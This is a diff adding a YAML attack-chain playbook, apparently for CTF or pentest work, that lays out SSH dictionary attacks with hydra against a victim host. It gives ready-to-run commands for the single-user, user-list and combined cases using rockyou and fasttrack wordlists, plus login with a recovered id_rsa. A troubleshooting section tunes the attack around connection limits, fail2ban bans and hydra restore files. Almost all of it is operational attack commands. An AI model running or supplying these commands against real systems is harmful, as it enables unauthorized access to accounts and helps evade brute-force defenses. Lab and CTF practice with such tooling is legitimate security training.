@@ -1,0 +1,85 @@
+chain_id: ssh_brute_force
+title: "SSH — dictionary attack with hydra"
+severity: HIGH
+tags: [ssh, brute-force, hydra, id_rsa]
+
+trigger:
+  any_of:
+    - { service: ssh }
+    - { port: 22 }
+
+description: |
+  Open SSH service. Hydra distinguishes case in flags: `-l` (lowercase) is ONE
+  user; `-L` (uppercase) is a FILE of users. Same for `-p` (one password) vs
+  `-P` (file of passwords). rockyou.txt has 14M entries — not viable against
+  SSH (would take days). Use small dictionaries or a head -1000 subset.
+
+steps:
+  - id: 1
+    title: "Try the obvious 5–10 passwords manually first"
+    command: ssh USUARIO@$VICTIMA
+    notes: |
+      For CTFs, `1234`, `password`, USUARIO, the CTF name, etc. solve it more
+      often than not. Test by hand before launching hydra.
+
+  - id: 2
+    title: "Case A — 1 known user, password dictionary"
+    command: hydra -l USUARIO -P /usr/share/wordlists/rockyou.txt ssh://$VICTIMA -t 4
+
+  - id: 3
+    title: "Smaller dictionaries for SSH"
+    command: |
+      hydra -l USUARIO -P /usr/share/wordlists/fasttrack.txt ssh://$VICTIMA -t 1
+      head -1000 /usr/share/wordlists/rockyou.txt > top1000.txt
+      hydra -l USUARIO -P top1000.txt ssh://$VICTIMA -t 1
+
+  - id: 4
+    title: "Case B — user list, 1 known password"
+    command: hydra -L users -p PASSWORD ssh://$VICTIMA -t 4
+    notes: |
+      Useful when a password was found (id_rsa, ZIP, encrypted message) and
+      tested across user candidates. `users` must contain one user per line.
+
+  - id: 5
+    title: "Case C — user list and password dictionary"
+    command: hydra -L users -P /usr/share/wordlists/rockyou.txt ssh://$VICTIMA -t 4
+
+  - id: 6
+    title: "Connect with discovered credentials"
+    command: ssh USUARIO@$VICTIMA
+
+  - id: 7
+    title: "If you have an id_rsa"
+    command: |
+      chmod 600 id_rsa
+      ssh -i id_rsa USUARIO@$VICTIMA
+
+common_errors:
+  - error: "Permissions 0644 for 'id_rsa' are too open"
+    solution: |
+      Restrict permissions: chmod 600 id_rsa
+  - error: "Too many authentication failures"
+    solution: |
+      Server closes due to too many tries. Force exclusive use of the key:
+        ssh -i id_rsa -o IdentitiesOnly=yes USUARIO@$VICTIMA
+  - error: "Hydra runs at 16-64 tries/min (abnormally slow)"
+    solution: |
+      Server limits concurrent connections (MaxStartups). Drop threads to 1
+      (slower per thread but reliable):
+        hydra -l USUARIO -P diccionario.txt ssh://$VICTIMA -t 1 -V
+      With many threads, connections close mid-attempt and the correct
+      password may be miscounted as a failure.
+  - error: "Hydra ends with '0 valid passwords found' but the password is correct"
+    solution: |
+      Three frequent causes: (1) too many threads (-t 4), drop to -t 1; (2)
+      fail2ban banned the attacker IP — wait 5–10 min or restart the target VM;
+      (3) the dictionary doesn't contain the exact password. Confirm manually
+      with: ssh USUARIO@$VICTIMA. If it works, hydra was the issue.
+  - error: "[WARNING] Restorefile from a previous session found"
+    solution: |
+      Hydra saves prior progress and sometimes merges it badly. Delete it:
+        rm -f hydra.restore
+        hydra -l USUARIO -P diccionario.txt ssh://$VICTIMA -t 1 -I
+
+references:
+  - https://book.hacktricks.xyz/network-services-pentesting/pentesting-ssh
